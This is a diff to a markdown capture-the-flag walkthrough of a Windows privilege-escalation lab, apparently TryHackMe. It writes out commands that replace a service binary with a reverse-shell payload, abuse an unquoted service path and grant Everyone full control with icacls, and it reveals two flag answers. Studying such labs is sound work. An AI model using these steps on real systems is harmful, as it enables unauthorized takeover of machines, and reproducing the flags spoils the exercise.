@@ -422,7 +422,7 @@ Go to the Administrator's desktop to retrieve a flag. Don't forget to input the 
 
 * Get the flag on svcusr1's desktop.
 	
-	``
+	`THM{AT_YOUR_SERVICE}`
 
 	* Query the service configuration
 	
@@ -432,10 +432,89 @@ Go to the Administrator's desktop to retrieve a flag. Don't forget to input the 
 	
 		![task5-payload](./images/task5-payload.png)
 
+		![task5-download](./images/task5-download.png)
+
+	* Replace original file with our payload
+	
+		```
+		cd C:\PROGRA~2\SYSTEM~1\
+		move WService.exe WService.exe.bkp
+		move C:\Users\thm-unpriv\rev-svc.exe WService.exe
+		icacls WService.exe /grant Everyone:F
+		```
+
+		![task5-replace](./images/task5-replace.png)
+
+	* Start a reverse listener on our attacker machine
+
+		![task5-listener](./images/task5-listener.png)
+
+	* Restart service
+	
+		![task5-restart](./images/task5-restart.png)
+
+	* Get the resverse shell & the flag
+	
+		`type C:\Users\svcusr1\Desktop\flag.txt`
+
+		![task5-svcusr1-flag](./images/task5-svcusr1-flag.png)
+
 * Get the flag on svcusr2's desktop.
+
+	`THM{QUOTES_EVERYWHERE}`
+
+	* Chek unqouted service
+	
+		![task5-unqouted-service](./images/task5-unqouted-service.png)
+
+	* Create and download payload
+		
+		![task5-payload2](./images/task5-payload2.png)
+
+		![task5-download2](./images/task5-download2.png)
+
+	* Replace original file with our payload
+	
+		```
+		move C:\Users\thm-unpriv\rev-svc2.exe C:\MyPrograms\Disk.exe
+		icacls C:\MyPrograms\Disk.exe /grant Everyone:F
+		```
+
+	* Start a reverse listener on our attacker machine
+
+		![task5-listener2](./images/task5-listener2.png)
+
+	* Restart service
+	
+		![task5-restart2](./images/task5-restart2.png)
+
+	* Get the resverse shell & the flag
+	
+		`type C:\Users\svcusr2\Desktop\flag.txt`
+
+		![task5-svcusr2-flag](./images/task5-svcusr2-flag.png)
 
 * Get the flag on the Administrator's desktop.
 
+	* Create and download payload
+	
+		![task5-payload3](./images/task5-payload3.png)
+
+		![task5-download3](./images/task5-download3.png)
+
+	* Set permission
+	
+		```
+		icacls C:\Users\thm-unpriv\rev-svc3.exe /grant Everyone:F
+		```
+
+		![task5-persmission](./images/task5-persmission.png)
+
+	* Start a reverse listener on our attacker machine
+
+		![task5-listener3](./images/task5-listener3.png)
+
+	
 ## Task 6 - Abusing dangerous privileges
 
 ### Windows Privileges
